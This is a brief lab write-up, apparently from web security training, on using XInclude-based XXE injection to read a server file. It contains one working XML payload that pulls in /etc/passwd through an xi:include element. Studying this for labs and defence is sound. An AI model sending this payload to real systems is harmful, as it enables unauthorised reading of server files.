Lab 7 - Exploiting XInclude to retrieve files

Target Goal - Exploit XXE injection to retrieve the content of the /etc/passwd

Analysis:

<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
